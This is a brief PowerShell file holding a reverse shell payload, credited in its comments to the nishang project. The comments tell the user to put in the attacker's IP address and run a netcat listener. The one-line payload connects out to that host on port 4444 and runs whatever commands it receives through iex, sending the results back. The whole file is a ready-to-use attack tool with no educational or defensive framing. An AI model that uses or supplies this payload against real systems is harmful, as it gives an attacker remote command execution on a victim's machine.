# This is the payload writen by nishang you can find it on github at https://github.com/samratashok/nishang/blob/master/powerpreter/Powerpreter.psm1
# change hostofnetcatlistener to attackers ip address, you can specify port aswell which will be same for your listener aswell which you'll be running on attackers machine
$sm=(New-Object Net.Sockets.TCPClient("hostofnetcatlistener",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}